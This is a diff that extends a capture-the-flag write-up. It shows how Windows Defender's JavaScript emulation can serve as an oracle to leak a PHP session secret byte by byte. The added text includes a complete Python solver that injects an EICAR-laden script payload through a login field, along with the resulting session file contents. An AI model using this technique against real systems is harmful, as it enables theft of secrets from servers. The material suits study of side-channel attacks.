@@ -354,4 +354,69 @@ realname|s:14:"Hello There...";nickname|s:14:"General Kenobi";secret|s:32:"742de
 
 We can see the session file contents, This is exactly what a Defender leak needs! A file on disk that gets read per
 user request which contains user controlled data and some secret we want to get
-our hands on.
+our hands on. We can use a `realname` that contains a `<script>` tag and trigger
+Windows Defender to execute the Javascript in the context of the file!
+
+We can modifiy the solution script that's in the TokyoWesterns
+[repo](https://github.com/icchy/wctf2019-gtf/blob/master/solver/solve.py) to
+work with this challenge:
+
+```python
+import requests
+import string
+
+URL = "http://localhost" # Change this to challenge URL
+
+def randstr(n=8):
+    import random
+    import string
+    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
+    return ''.join([random.choice(chars) for _ in range(n)])
+
+def trigger(c, idx):
+    print("[*] Triggering on {}[{}] at index {}".format(chr(c), c, idx))
+    prefix = randstr()
+
+    p = prefix + '''<html><script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script>'''
+
+    p = string.Template(p).substitute({'idx': idx, 'c': c})
+
+    sess = requests.session()
+    data = {
+        "realname": "{}<body>".format(p),
+        "nickname": "HACKX</body>",
+    }
+
+    sess.post(URL + '/?action=login', data=data)
+    return sess.get(URL + "/?action=getflag").status_code
+
+def leak(idx):
+    l, h = 0, 0x100
+    while h - l > 1:
+        m = (h + l) // 2
+
+        if trigger(m, idx) == 500:
+            l = m
+        else:
+            h = m
+
+    return chr(l)
+
+data = ''
+for i in range(30):
+    data += leak(i)
+    print(data)
+```
+
+Running this and checking the state of the session file now, we can see the
+format it gives us on disk:
+
+```php
+$ docker exec -it my-apache-php-app cat /tmp/sess_0bb85a780cb24c778ac77a16fc4c866a
+
+realname|s:196:"pzvpUGnz<html><script>f=function(n){eval('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H'+{8:'*'}[Math.min(8,n)])};f(document.body.innerHTML[0].charCodeAt(0));</script><body>";nickname|s:19:"HACKX</body><title>";secret|s:32:"e81958d8cc55411d0c2576c15aae23d2";
+```
+
+Since this looks dodgy, Defender executes this Javascript, we can then use our
+ability to access `document.body.innerHTML` as an oracle and leak byte by byte
+characters in `<body>`!
